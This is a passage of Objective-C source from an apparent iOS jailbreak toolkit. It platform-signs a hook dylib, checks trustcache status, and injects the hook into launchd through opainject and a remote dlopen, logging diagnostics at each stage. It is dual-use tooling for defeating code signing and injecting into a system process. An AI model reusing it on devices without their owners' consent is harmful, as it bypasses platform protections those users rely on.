    dt699_stage("BUILD102738Y_INSERTION_AFTER_PHYSRW_HANDOFF");
#elif defined(DT_BUILD102738X_VARIANT)
    dt699_stage("BUILD102738X_INSERTION_AFTER_PHYSRW_HANDOFF");
#elif defined(DT_BUILD102738W_VARIANT)
    dt699_stage("BUILD102738W_INSERTION_AFTER_PHYSRW_HANDOFF");
#endif
#elif DT_BUILD_NUM == 102736
    dt699_stage("BUILD102736C_INSERTION_AFTER_PHYSRW_HANDOFF");
#elif DT_BUILD_NUM == 102734
    dt699_stage("BUILD102734C_INSERTION_AFTER_PHYSRW_HANDOFF");
#endif
    return dt102732c_run_constructor_boomerang_only(log, verdictOut);
#endif

#if DT_BUILD_NUM != 102732 && DT_BUILD_NUM != 102733 && DT_BUILD_NUM != 102734 && DT_BUILD_NUM != 102735 && DT_BUILD_NUM != 102736 && DT_BUILD_NUM != 102737 && DT_BUILD_NUM != 102738
    dt710_log_preboot_paths(log);
    dt710_log_var_jb_compat_state(log);
    if (!dt710_verify_path_coherence(log)) {
        dt1025_set_verdict(verdictOut, @"BUILD102710_PATH_COHERENCE_FAIL");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        return -70;
    }

    dt699_stage("BUILD102721_CANONICAL_PATH_REACHABLE=YES");
    dt699_stage("BUILD102721_MKDIR_REACHABLE=YES");
    dt699_stage("BUILD102721_STAGE_REACHABLE=YES");

    if (dt102721_run_preboot_rw_gate(log, verdictOut, &preboot_rw_confirmed) != 0) {
        dt699_stage("PHASE_A_PLATFORM_BLOB=NOT_RUN");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        return -721;
    }

    if (dt681_stage_handoff_basebin(log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL699_BASEBIN_STAGE_FAIL");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return -2;
    }

    NSString *bundledHook = [[NSBundle mainBundle].bundlePath
        stringByAppendingPathComponent:@"Handoff516/launchdhook516.dylib"];
    NSString *preSignStagedSha = dt699_sha256_path(dt102710_hook_path_ns());
    NSString *bundledSha = dt699_sha256_path(bundledHook);
    if (![preSignStagedSha isEqualToString:bundledSha]) {
        dt1025_log(log, @"[!] build699 pre-sign staged/bundle mismatch staged=%@ bundled=%@",
            preSignStagedSha, bundledSha);
        dt1025_set_verdict(verdictOut, @"KCALL699_PRE_SIGN_IDENTITY_MISMATCH");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return -21;
    }

    dt699_stage("BUILD102721_SIGNING_PATH_REACHED=YES");

    dt1025_log(log, @"[*] KCALL702_PRE_SIGN_STAGED_SHA256=%@", preSignStagedSha);
    dt699_stage([[NSString stringWithFormat:@"KCALL702_PRE_SIGN_STAGED_SHA256=%@", preSignStagedSha ?: @""] UTF8String]);

    NSString *installedBundleCdHex = dt699_cdhash_path(bundledHook);
    NSString *preSignStagedCdHex = dt699_cdhash_path(dt102710_hook_path_ns());
    BOOL preSignCopyMatch = [preSignStagedSha isEqualToString:bundledSha];
    dt699_stage([[NSString stringWithFormat:@"KCALL706_INSTALLED_BUNDLE_SHA256=%@", bundledSha ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL706_INSTALLED_BUNDLE_CDHASH=%@", installedBundleCdHex ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL706_PRE_SIGN_STAGED_SHA256=%@", preSignStagedSha ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL706_PRE_SIGN_STAGED_CDHASH=%@", preSignStagedCdHex ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL706_PRE_SIGN_COPY_MATCH=%@", preSignCopyMatch ? @"YES" : @"NO"] UTF8String]);

    if (dt704_choma_platform_sign_staged_hook(log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL704_CHOMA_PLATFORM_SIGN_FAIL");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return -22;
    }

    dt699_stage("BUILD102722_CHOMA_SIGN_COMPLETE");
    dt699_stage("BUILD102721_TRUST_PATH_REACHED=YES");

    if (dt102722_run_batched_trustcache_closure(log) != 0) {
        dt1025_set_verdict(verdictOut, @"BUILD102722_BATCH_TRUST_CLOSURE_FAIL");
        dt699_stage("KCALL699_POST_SIGN_TRUSTCACHE_RESULT=FAIL");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        dt102722_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return -722;
    }
    batch_trust_closure_passed = YES;

    dt699_stage("BUILD102722_PHASE_A_REACHED=YES");

    cdhash_t postSignCd = {0};
    if (dt_macho_best_cdhash_from_path(dt102710_hook_path_cstr(), postSignCd) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL699_POST_SIGN_CDHASH_FAIL");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return -24;
    }

    NSString *postSignSha = dt699_sha256_path(dt102710_hook_path_ns());
    NSString *postSignCdHex = dt_cdhash_hex_string(postSignCd);
    NSString *postChomaSha = postSignSha;
    NSString *postChomaCdHex = postSignCdHex;
    dt699_stage([[NSString stringWithFormat:@"POST_SIGN_ARTIFACT_SHA256=%@", postSignSha ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"POST_SIGN_ARTIFACT_CDHASH=%@", postSignCdHex] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL706_POST_CHOMA_SHA256=%@", postChomaSha ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL706_POST_CHOMA_CDHASH=%@", postChomaCdHex ?: @""] UTF8String]);

    if (!dt_cdhash_trustcached(postSignCd)) {
        if (batch_trust_closure_passed) {
            cdhash_t batchHookCd = {0};
            (void)dt_macho_best_cdhash_from_path(dt102710_hook_path_cstr(), batchHookCd);
            BOOL memeq = memcmp(batchHookCd, postSignCd, CS_CDHASH_LEN) == 0;
            BOOL batchLookup = dt_cdhash_trustcached(batchHookCd);
            BOOL phaseLookup = dt_cdhash_trustcached(postSignCd);
            dt699_stage("BUILD102722_BATCH_VERIFY_PHASE_A_CONTRADICTION");
            dt699_stage([[NSString stringWithFormat:@"BUILD102722_BATCH_HOOK_CDHASH=%@",
                dt_cdhash_hex_string(batchHookCd)] UTF8String]);
            dt699_stage([[NSString stringWithFormat:@"BUILD102722_PHASE_A_POST_SIGN_CDHASH=%@",
                postSignCdHex] UTF8String]);
            dt699_stage([[NSString stringWithFormat:@"BUILD102722_BATCH_PHASEA_MEMCMP_EQUAL=%@",
                memeq ? @"YES" : @"NO"] UTF8String]);
            dt699_stage([[NSString stringWithFormat:@"BUILD102722_BATCH_LOOKUP_POST_SIGN=%@",
                batchLookup ? @"PASS" : @"FAIL"] UTF8String]);
            dt699_stage([[NSString stringWithFormat:@"BUILD102722_PHASEA_LOOKUP_POST_SIGN=%@",
                phaseLookup ? @"PASS" : @"FAIL"] UTF8String]);
        }
        dt1025_set_verdict(verdictOut, @"KCALL699_POST_SIGN_NOT_TRUSTED");
        dt699_stage("KCALL699_POST_SIGN_TRUSTCACHE_RESULT=FAIL");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return -25;
    }
    dt699_stage("KCALL699_POST_SIGN_TRUSTCACHE_RESULT=OK");

    if (dt102723_run_signed_hook_structural_gate(postSignCd, log) != 0) {
        dt1025_set_verdict(verdictOut, @"BUILD102723_SIGNED_HOOK_STRUCTURAL_GATE_FAIL");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt102722_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return -7231;
    }

    dt102724_run_isolated_dyld_load_probe_telemetry(log);

    NSString *manifestSha = dt699_read_manifest_value(@"PLATFORM_HOOK_SHA256");
    NSString *manifestCd = dt699_read_manifest_value(@"PLATFORM_HOOK_CDHASH");
    BOOL packageToInstalledMatch = [bundledSha isEqualToString:manifestSha]
        && ![manifestSha isEqualToString:@"UNAVAILABLE"];

    dt1025_log(log, @"[*] KCALL699_TARGET_SHA256=%@", bundledSha);
    dt1025_log(log, @"[*] KCALL699_TARGET_CDHASH=%@", installedBundleCdHex);
    dt1025_log(log, @"[*] KCALL699_BUILD_MANIFEST_SHA256=%@", manifestSha);
    dt1025_log(log, @"[*] KCALL699_BUILD_MANIFEST_CDHASH=%@", manifestCd);
    dt1025_log(log, @"[*] KCALL699_DEVICE_STAGED_SHA256=%@", postSignSha);
    dt1025_log(log, @"[*] KCALL699_DEVICE_STAGED_CDHASH=%@", postSignCdHex);
    dt699_stage("KCALL699_TARGET_SHA256");
    dt699_stage("KCALL699_TARGET_CDHASH");

    dt699_stage([[NSString stringWithFormat:@"KCALL706_PACKAGE_MANIFEST_SHA256=%@", manifestSha ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL706_PACKAGE_TO_INSTALLED_BUNDLE_MATCH=%@",
        packageToInstalledMatch ? @"YES" : @"NO"] UTF8String]);
    if (!packageToInstalledMatch && ![manifestSha isEqualToString:@"UNAVAILABLE"])
        dt699_stage("INSTALL_TIME_IDENTITY_TRANSFORM_OBSERVED");

    dt1025_log(log, @"[*] 699_BUILD_TO_BUNDLE_BINARY_MATCH=%@",
        packageToInstalledMatch ? @"YES" : @"NO");
    dt1025_log(log, @"[*] 699_PRE_SIGN_STAGED_TO_BUNDLE_MATCH=%@",
        preSignCopyMatch ? @"YES" : @"NO");
    dt1025_log(log, @"[*] 699_POST_PLATFORM_STAGED_SHA256=%@", postSignSha);
    dt1025_log(log, @"[*] 699_BUILD_TO_DEVICE_CDHASH_MATCH=%@",
        [postSignCdHex isEqualToString:manifestCd] ? @"YES" : @"NO");

    dt102724_run_preinjection_snapshot(log, postSignCd);

    NSString *phaseAFinalSha = dt699_sha256_path(dt102710_hook_path_ns());
    NSString *phaseAFinalCdHex = dt699_cdhash_path(dt102710_hook_path_ns());
    dt699_stage([[NSString stringWithFormat:@"KCALL707_PHASE_A_FINAL_SHA256=%@", phaseAFinalSha ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"KCALL707_PHASE_A_FINAL_CDHASH=%@", phaseAFinalCdHex ?: @""] UTF8String]);

    /* Phase B — launchd is the real load actor; pre-injection helper dlopen is telemetry only */
    dt699_stage("BUILD102724_PHASE_B_REACHABLE=YES");
    dt699_stage("BUILD102724_PHASE_B_REACHED=YES");
    dt699_stage("BUILD102722_PHASE_B_REACHED=YES");
    dt699_stage("PHASE_B_LAUNCHD_TEST=BEGIN");
    NSString *phaseBVerdict = nil;
    int pr = dt698_run_launchd_wall1_diagnostic_ex(log, &phaseBVerdict, YES);
    dt102724_emit_post_injection_telemetry(log, postSignCd, pr);
    if (pr == 0) {
        dt699_stage("PHASE_B_LAUNCHD_TEST=PASS");
        dt699_stage("BUILD102724_SAFE_FOR_CONTROLLED_DEVICE_TEST=YES");
        if (verdictOut)
            *verdictOut = phaseBVerdict ?: @"BUILD102699_DIAGNOSTIC_COMPLETE";
        return 0;
    }

    dt699_stage("PHASE_B_LAUNCHD_TEST=FAIL");
    dt699_stage("BUILD102724_REBOOT_REQUIRED_BEFORE_NEXT_TEST");
    dt699_stage("BUILD102724_PREBOOT_MAY_REMAIN_RW=YES");
    dt699_stage("BUILD102724_PREBOOT_RO_RECOVERY_AFTER_REBOOT=NOT_PROVEN");
    if (verdictOut)
        *verdictOut = phaseBVerdict ?: @"BUILD102699_PHASE_B_FAIL";
    dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
    return pr;
#endif
}

#ifdef DT_ROOTLESS_R4
/* Shared-orchestrator physical leaves. These call the existing static helpers
 * without wrapping dt102732c_run_constructor_boomerang_only / run699. */
static struct {
    dt102732c_artifact_t artifacts[3];
    dt102732c_wall2_context_t wall2;
    dt681_boomerang_info_t boomerang;
    dt102735d_trace_ctx_t trace_ctx;
    dt102735d_trace_observation_t trace_obs;
    BOOL prepared;
    BOOL boomerang_started;
    BOOL wall2_applied;
    BOOL inject_done;
    BOOL restored;
    BOOL observed;
    int inject_r;
    int restore_r;
    int remote_dlopen_rc;
} g_r10;

static NSString *g_r10_inject_capture;

void dt_rootless_leaf_cleanup(void)
{
    if (g_r10.wall2.active)
        (void)dt102732c_restore_wall2(&g_r10.wall2, nil);
    if (g_r10.wall2.launchd_proc) {
        proc_rele(g_r10.wall2.launchd_proc);
        g_r10.wall2.launchd_proc = 0;
    }
    if (g_r10.boomerang_started)
        dt681_boomerang_cleanup(&g_r10.boomerang);
    g_r10_inject_capture = nil;
    g_r10.artifacts[0].path = nil;
    g_r10.artifacts[1].path = nil;
    g_r10.artifacts[2].path = nil;
    memset((void *)&g_r10, 0, sizeof(g_r10));
    g_r10.inject_r = -1;
    g_r10.restore_r = -1;
    g_r10.remote_dlopen_rc = -1;
}

int dt_rootless_leaf_prepare(void (^log)(NSString *line))
{
    if (g_r10.prepared)
        return 0;
    BOOL preboot_rw_confirmed = NO;
    NSString *verdict = nil;
    if (!dt710_verify_path_coherence(log))
        return -1;
    if (dt102721_run_preboot_rw_gate(log, &verdict, &preboot_rw_confirmed) != 0)
        return -1;
    if (dt681_stage_handoff_basebin(log) != 0)
        return -1;
#if defined(DT_ROOTLESS_R24)
    /* Live orch path: D0 must run after stage and before sign (20:15 gap fix). */
    dt699_stage(kRootlessR24D0LeafPrepareCheck);
    if (dt_r24_verify_d0_handoff_identity() != 0) {
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return -73204;
    }
#endif
    if (dt102735d_trace_preflight(&g_r10.trace_ctx, log) != 0)
        return -1;
    memset((void *)g_r10.artifacts, 0, sizeof(g_r10.artifacts));
    g_r10.artifacts[0].name = "LAUNCHDHOOK";
    g_r10.artifacts[0].auth_marker = "LAUNCHDHOOK";
    g_r10.artifacts[0].identifier = "launchdhook516.dylib";
    g_r10.artifacts[0].path = dt710_resolve_hook_path();
    g_r10.artifacts[1].name = "LIBJAILBREAK";
    g_r10.artifacts[1].auth_marker = "LIBJAILBREAK";
    g_r10.artifacts[1].identifier = "libjailbreak.dylib";
    g_r10.artifacts[1].path = dt710_resolve_libjailbreak_path();
    g_r10.artifacts[2].name = "LIBCHOMA";
    g_r10.artifacts[2].auth_marker = "LIBCHOMA";
    g_r10.artifacts[2].identifier = "libchoma.dylib";
    g_r10.artifacts[2].path = dt710_resolve_libchoma_path();
    for (size_t i = 0; i < 3; i++) {
        if (dt102732c_sign_artifact(&g_r10.artifacts[i], log) != 0)
            return -1;
    }
    g_r10.prepared = YES;
    return 0;
}

int dt_rootless_leaf_dep_gate(void (^log)(NSString *line))
{
    if (dt_rootless_leaf_prepare(log) != 0)
        return -1;
    return dt102732c_dependency_gate(g_r10.artifacts);
}

int dt_rootless_leaf_trust_trio(void (^log)(NSString *line))
{
    if (dt_rootless_leaf_prepare(log) != 0)
        return -1;
    return dt102732c_trust_trio(g_r10.artifacts);
}

int dt_rootless_leaf_boomerang(void (^log)(NSString *line))
{
    if (g_r10.boomerang_started)
        return 0;
    if (dt681_boomerang_start(&g_r10.boomerang, log) != 0)
        return -1;
    g_r10.boomerang_started = YES;
    return 0;
}

int dt_rootless_leaf_stash_port(void (^log)(NSString *line))
{
    if (!g_r10.boomerang_started)
        return -1;
    NSString *stashVerdict = nil;
    return dt681_kcall_stash_boomerang_port(g_r10.boomerang.serverPort, log, &stashVerdict);
}

int dt_rootless_leaf_wall2_apply(void (^log)(NSString *line))
{
    if (g_r10.wall2_applied)
        return 0;
    if (dt_rootless_leaf_prepare(log) != 0)
        return -1;
    if (dt102732c_wall2_authorize_trio(g_r10.artifacts, log, &g_r10.wall2) != 0)
        return -1;
    g_r10.wall2_applied = YES;
    return 0;
}

int dt_rootless_leaf_opainject1(void (^log)(NSString *line))
{
    if (g_r10.inject_done)
        return g_r10.inject_r;
    NSString *hook = dt710_resolve_hook_path();
    NSString *capture = nil;
    g_r10.inject_r = dt681_spawn_opainject_launchd(hook.fileSystemRepresentation,
        log, &capture);
    g_r10_inject_capture = capture;
    g_r10.inject_done = YES;
    g_r10.remote_dlopen_rc = dt102735d_extract_remote_dlopen_rc(g_r10_inject_capture);
    if (g_r10.remote_dlopen_rc == INT_MIN)
        g_r10.remote_dlopen_rc = g_r10.inject_r == 0 ? -73770 : g_r10.inject_r;
    return g_r10.inject_r;
}

int dt_rootless_leaf_wall2_restore(void (^log)(NSString *line))
{
    if (g_r10.restored)
        return g_r10.restore_r;
    g_r10.restore_r = dt102732c_restore_wall2(&g_r10.wall2, log);
    if (g_r10.wall2.launchd_proc) {
        proc_rele(g_r10.wall2.launchd_proc);
        g_r10.wall2.launchd_proc = 0;
    }
    g_r10.restored = YES;
    return g_r10.restore_r;
}

int dt_rootless_leaf_observe_ctor(void (^log)(NSString *line),
                                  dt_rootless_r9_ctor_inputs_t *out)
{
    if (!g_r10.observed) {
        memset(&g_r10.trace_obs, 0, sizeof(g_r10.trace_obs));
        g_r10.trace_obs.boomerang_wait_rc = -1;
        if (g_r10.restore_r == 0 && g_r10.inject_r == 0 && g_r10.remote_dlopen_rc == 0
            && g_r10.boomerang_started) {
            (void)dt102735d_poll_trace_and_boomerang(&g_r10.trace_ctx, &g_r10.boomerang, log,
                &g_r10.trace_obs);
        }
        g_r10.observed = YES;
    }
    if (out) {
        memset(out, 0, sizeof(*out));
        out->restore_r = g_r10.restore_r;
        out->inject_r = g_r10.inject_r;
        out->remote_dlopen_rc = g_r10.remote_dlopen_rc;
        out->boomerang_wait_rc = g_r10.trace_obs.boomerang_wait_rc;
        out->ctor_return_pass = g_r10.trace_obs.ctor_return_pass;
        out->ctor_exit_reached = g_r10.trace_obs.ctor_exit_reached;
        out->primitives_init_pass = g_r10.trace_obs.primitives_init_pass;
        out->boomerang_done_send_pass = g_r10.trace_obs.boomerang_done_send_pass;
        out->got_probe_terminal_pass = g_r10.trace_obs.got_probe_terminal_pass;
        out->got_restore_pass = g_r10.trace_obs.got_restore_pass;
        out->got_restore_fatal = g_r10.trace_obs.got_restore_fatal;
    }
    return 0;
}
#endif /* DT_ROOTLESS_R4 */
